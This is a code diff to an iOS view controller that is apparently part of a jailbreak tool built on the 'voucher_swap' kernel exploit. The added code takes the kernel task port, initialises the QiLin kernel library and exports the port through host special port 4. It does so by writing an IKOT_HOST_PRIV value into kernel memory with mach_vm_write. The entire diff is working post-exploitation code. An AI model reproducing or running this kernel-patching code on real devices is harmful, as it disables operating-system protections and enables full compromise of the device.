@@ -18,6 +18,10 @@
 #include "../PostExploit/ExploitBridger.h"
 #include "../PostExploit/offsets.h"
 #include "../RootUnit/noncereboot.h"
+#include "../RootUnit/QiLin.h"
+#include "../RootUnit/utilities/kutils.h"
+#include "../RootUnit/hsp4.h"
+
 
 @interface ViewController ()
 
@@ -49,6 +53,10 @@
 
 }
 
+#define IO_ACTIVE 0x80000000
+#define IKOT_HOST 3
+#define IKOT_HOST_PRIV 4
+
 - (IBAction)postExploit:(id)sender {
     
     _outPutWindow.text = [[_outPutWindow text] stringByAppendingString: @"\n\n---\nStarting Exploiting... using voucher_swap method."];
@@ -59,7 +67,11 @@
         mach_port_t tfp0 = MACH_PORT_NULL;
         kern_return_t kErr = host_get_special_port(mach_host_self(), 0, 4, &tfp0);
         if (kErr != KERN_SUCCESS && !MACH_PORT_VALID(tfp0)) {
+            // Get tfp0
             tfp0 = grab_this_tfp0();
+            // Init kernel base val
+            init_kern_base();
+            init_tfp0_at_hsp4(tfp0);
         }
         if (MACH_PORT_VALID(tfp0)) {
             NSString * output = [[NSString alloc] initWithFormat:@"\nSuccessfully find our tfp0 at:0x%x", tfp0];
@@ -72,6 +84,39 @@
                     dispatch_async(dispatch_get_main_queue(), ^{
                         self->_outPutWindow.text = [[self->_outPutWindow text] stringByAppendingString: @"\nGot root and UID 0.\nDone."];
                         [self->_openFileManager setHidden:NO];
+                        
+                        //init QILIN
+                        initQiLin(tfp0, return_kern_base());
+                        
+                        // Exporting tfp0...
+                        uint64_t hostport_addr = read_our_proc();
+                        // Getting rk32.
+                        uint32_t old;
+                        mach_vm_size_t outsize = 0;
+                        kern_return_t thisErr = 0;
+                        // Kernel remap?
+                        remap_tfp0_set_hsp4(&tfp0, read_find_zone_ref_offset());
+
+                        thisErr = mach_vm_read(tfp0,
+                                               (mach_vm_address_t)hostport_addr,
+                                               (mach_vm_size_t)sizeof(uint32_t),
+                                               (mach_vm_address_t)&old,
+                                               &outsize);
+                        printf("old host type: 0x%08x\n", old);
+                        if (thisErr != KERN_SUCCESS) {
+                            printf("KERN_ERR with code: %d\n", thisErr);
+                        }
+                        // Now, write to kernel!
+                        uint32_t mem_msg = IO_ACTIVE | IKOT_HOST_PRIV;
+                        thisErr = mach_vm_write(tfp0,
+                                                (mach_vm_address_t)hostport_addr,
+                                                (vm_offset_t)&mem_msg,
+                                                (mach_msg_type_number_t)sizeof(uint32_t));
+                        if (thisErr != KERN_SUCCESS) {
+                            printf("KERN_ERR with code: %d\n", thisErr);
+                        }
+                        
+                        
                     });
                 }else{
                     dispatch_async(dispatch_get_main_queue(), ^{
